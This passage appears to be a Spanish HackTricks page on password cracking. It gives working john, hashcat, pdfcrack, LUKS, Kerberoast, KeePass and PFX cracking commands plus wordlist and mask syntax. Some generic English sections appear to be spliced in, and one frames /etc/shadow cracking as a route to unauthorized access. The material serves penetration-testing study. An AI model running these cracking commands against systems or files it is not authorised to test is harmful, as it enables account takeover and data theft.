La fuerza bruta es un método comúnmente utilizado en la piratería ética para probar contraseñas débiles. Consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Este método puede ser efectivo, pero puede llevar mucho tiempo dependiendo de la complejidad de la contraseña y de la potencia de procesamiento de la máquina utilizada. Es importante tener en cuenta que la fuerza bruta puede ser detectada por sistemas de seguridad y puede resultar en bloqueos de cuentas o direcciones IP.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Contraseña del Propietario de PDF

Para crackear una contraseña del propietario de PDF, revisa esto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Descifrado de NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting es una técnica utilizada para extraer hashes de contraseñas de cuentas de servicio de Active Directory sin necesidad de autenticación.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Imagen de Lucks

#### Método 1

Instalar: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Método 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Otro tutorial de BF de Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clave privada PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### Clave maestra de DPAPI

Utiliza [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) y luego john

### Columna protegida por contraseña de Open Office

Si tienes un archivo xlsx con una columna protegida por una contraseña, puedes desprotegerla:

* **Súbelo a Google Drive** y la contraseña se eliminará automáticamente
* Para **eliminarla** de forma **manual**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificados PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Herramientas

**Ejemplos de hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identificador de hash
```bash
hash-identifier
> <HASH>
```
### Listas de palabras

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Herramientas de generación de listas de palabras**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generador avanzado de secuencias de teclado con caracteres base configurables, mapa de teclas y rutas.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutación de John

Leer _**/etc/john/john.conf**_ y configurarlo
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Ataques de Hashcat

* **Ataque de lista de palabras** (`-a 0`) con reglas

**Hashcat** ya viene con una **carpeta que contiene reglas** pero puedes encontrar [**otras reglas interesantes aquí**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Ataque de combinación de listas de palabras**

Es posible **combinar 2 listas de palabras en 1** con hashcat.\
Si la lista 1 contenía la palabra **"hello"** y la segunda contenía 2 líneas con las palabras **"world"** y **"earth"**. Se generarán las palabras `helloworld` y `helloearth`.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Ataque de máscara** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Ataque de Wordlist + Máscara (`-a 6`) / Ataque de Máscara + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modos de Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
## Brute Forcing

### Introduction

Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute forcing involves generating potential passwords and hashing them using the same algorithm and salt as the target hash. If the generated hash matches the target hash, the password has been successfully cracked.

### Tools

There are various tools available for brute forcing passwords, such as John the Ripper, Hashcat, and Hydra. These tools support different algorithms and techniques for password cracking, making them versatile and powerful for cracking Linux hashes.

### Methodology

1. **Obtain the Hash**: Extract the target hash from the `/etc/shadow` file on the Linux system you are targeting.

2. **Choose a Tool**: Select a password cracking tool that supports the hashing algorithm used in the target hash.

3. **Generate Password List**: Create a list of potential passwords to be used for brute forcing. This list can be based on common passwords, dictionary words, or custom patterns.

4. **Start Brute Forcing**: Use the selected tool to systematically hash the passwords from your list and compare them with the target hash. If a match is found, the password has been cracked.

5. **Optimize**: Adjust the password list and cracking parameters based on the progress and results of the brute forcing process to increase efficiency.

### Conclusion

Brute forcing Linux hashes from the `/etc/shadow` file can be a time-consuming process, especially for complex passwords. However, with the right tools and techniques, it is possible to crack passwords and gain unauthorized access to a Linux system.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
## Brute Force

### Introduction

Brute force attacks are a common and effective way to crack Windows hashes. This method involves trying all possible combinations of characters until the correct password is found. Brute force attacks can be time-consuming but are often successful if the password is not strong enough.

### Tools

There are several tools available for conducting brute force attacks on Windows hashes. Some popular tools include:

- **John the Ripper**: A powerful password-cracking tool that can be used for brute force attacks on Windows hashes.
- **Hashcat**: Another popular tool for cracking passwords, including Windows hashes.
- **Hydra**: A fast and flexible password-cracking tool that supports brute force attacks on various protocols, including Windows authentication.

### Techniques

When conducting a brute force attack on Windows hashes, it is important to consider the following techniques:

- **Dictionary Attacks**: Using a list of commonly used passwords to speed up the brute force process.
- **Mask Attacks**: Specifying a mask for the password format to reduce the number of possible combinations.
- **Hybrid Attacks**: Combining dictionary and brute force attacks to increase the chances of success.

### Conclusion

Brute force attacks can be a powerful tool for cracking Windows hashes, especially when other methods have failed. By using the right tools and techniques, hackers can increase their chances of successfully recovering passwords from Windows systems.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
## Brute Force

### Introduction

Brute force attacks are a common method used to crack passwords by systematically trying all possible combinations until the correct one is found. This technique can also be applied to crack common application hashes.

### Methodology

1. **Identify Hash Algorithm**: Determine the hash algorithm used by the application to hash passwords.
   
2. **Wordlist Generation**: Create a wordlist containing common passwords, dictionary words, and variations.

3. **Hash Passwords**: Hash the passwords in the wordlist using the same algorithm as the application.

4. **Compare Hashes**: Compare the hashed passwords from the wordlist with the application's hashed passwords.

5. **Brute Force Attack**: Use a tool like Hashcat or John the Ripper to systematically brute force the passwords by trying each entry in the wordlist.

6. **Crack Password**: Once a match is found, the corresponding password in the wordlist is the cracked password.

### Resources

- Hashcat: [https://hashcat.net/](https://hashcat.net/)
- John the Ripper: [https://www.openwall.com/john/](https://www.openwall.com/john/)
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente impulsados por las herramientas comunitarias **más avanzadas** del mundo.\
¡Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
